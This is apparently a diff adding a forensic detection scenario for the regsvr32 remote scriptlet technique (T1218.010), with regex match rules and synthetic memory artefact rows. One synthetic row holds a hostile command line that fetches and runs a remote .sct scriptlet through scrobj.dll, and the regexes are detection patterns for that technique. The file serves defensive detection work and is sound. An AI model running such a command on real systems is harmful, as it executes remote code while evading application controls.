@@ -1,0 +1,46 @@
+id = "S03"
+name = "regsvr32 remote scriptlet"
+technique = "T1218.010"
+tactic = "defense-evasion"
+platform = "windows"
+environment = "onprem"
+timepoints = [0, 5, 15, 60]
+notes = "Atomic Red Team T1218.010 tests."
+
+[[artefact]]
+id = "regsvr32_cmdline"
+category = "execution"
+weight = 3
+plugin = "windows.cmdline.CmdLine"
+[artefact.match]
+Args = '(?i)regsvr32.*(/i:https?://|scrobj\.dll)'
+[artefact.partial]
+Args = '(?i)regsvr32.*/s'
+[artefact.synthetic]
+p = [1.0, 0.6, 0.2, 0.0]
+row = { PID = 6012, Process = "regsvr32.exe", Args = 'regsvr32.exe /s /n /u /i:http://192.0.2.10/x.sct scrobj.dll' }
+partial_row = { PID = 6012, Process = "regsvr32.exe", Args = 'regsvr32.exe /s foo.dll' }
+
+[[artefact]]
+id = "regsvr32_scrobj_loaded"
+category = "execution"
+weight = 2
+plugin = "windows.dlllist.DllList"
+description = "Script Component runtime loaded into regsvr32."
+[artefact.match]
+Process = '(?i)^regsvr32'
+Name = '(?i)^scrobj\.dll$'
+[artefact.synthetic]
+p = [1.0, 0.6, 0.2, 0.0]
+row = { PID = 6012, Process = "regsvr32.exe", Name = "scrobj.dll", Path = 'C:\Windows\System32\scrobj.dll' }
+
+[[artefact]]
+id = "regsvr32_network"
+category = "network"
+weight = 2
+plugin = "windows.netscan.NetScan"
+[artefact.match]
+Owner = '(?i)^regsvr32'
+[artefact.synthetic]
+p = [0.9, 0.3, 0.05, 0.0]
+row = { PID = 6012, Owner = "regsvr32.exe", Proto = "TCPv4", ForeignAddr = "192.0.2.10", ForeignPort = 80, State = "CLOSE_WAIT" }
